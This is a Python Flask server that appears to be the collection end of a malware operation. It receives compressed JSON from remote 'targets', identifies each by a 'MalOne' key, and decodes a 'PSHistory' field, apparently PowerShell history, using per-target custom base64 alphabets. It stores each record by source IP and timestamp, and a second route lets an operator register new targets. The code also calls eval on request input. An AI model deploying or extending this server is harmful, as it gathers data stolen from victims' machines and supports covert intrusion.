import sys
import json
from datetime import datetime
from flask import Flask, request
import zlib, base64
import hmac
import hashlib
import os
import pandas as pd


app = Flask(__name__)

# Replace this with your actual secret key
SECRET_KEY = b"YOUR KEY"

STANDARD_ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'


def recode64(json,charset):
    DECODE_TRANS = str.maketrans(charset, STANDARD_ALPHABET)
    json["PSHistory"] = base64.b64encode(base64.b64decode(json["PSHistory"].translate(DECODE_TRANS))).decode("utf-8")


@app.route("/GetData", methods=["POST"])
def receive_post_data():
    compressed_data = request.data
    f = open("statham.json",'r')
    db = json.load(f)
    decompressed_data = zlib.decompress(compressed_data)
    do = open("last_dbg.json", 'wb')
    do.write(decompressed_data)
    jdump = json.loads(decompressed_data)
    malonec = request.cookies.get("malone")
    maloned = jdump["MalOne"]
    target = "__unknowntarget__"
    df = pd.DataFrame(list(db.items()), columns=['Key', 'Value'])
    if malonec != maloned:
        jdump["HTTPHook"] = "True"
    matching_keys = df[df['Value'].apply(lambda x: x[0]) == maloned]['Key'].tolist()
    if matching_keys:
        target = matching_keys[0]
        jdump["Target"] = target
    if target != "__unknowntarget__":
        recode64(jdump,db[target][1])
    with open(
            "data/"
            + str(request.remote_addr)
            + "_" + target + "_"
            + str(datetime.now()).replace(" ", "")
            + ".json",
            "w",
    ) as fout:
        json.dump(jdump,fout)
    return "OK", 200

@app.route("/MalOne", methods=["POST"])
def mal_one():

    data = request.get_json()
    received_message = eval(json.dumps(data.get("message")))
    received_hmac = data.get("hmac")
    computed_hmac = (hmac.new(SECRET_KEY, str(received_message).encode("utf-8"), hashlib.sha256).hexdigest())
    if computed_hmac == received_hmac:
        if not os.path.exists("./statham.json"):
            f = open("statham.json", 'w+')
            json.dump({"__JSON__INIT":"__BLANK"}, f)
            f.close()
        f = open("statham.json", 'r+')
        d = json.load(f)
        d.update(received_message)
        f.seek(0)
        f.truncate(0)
        json.dump(d,f)
        f.close()
        return "Updated", 200
    else:
        return "Failed", 401




if __name__ == "__main__":
    app.run(
        host="0.0.0.0",
        port=443,
        debug=False,
        ssl_context=(
            "/opt/tricard/server/ssl/fullchain.pem",
            "/opt/tricard/server/ssl/privkey.pem",
        ),
    )
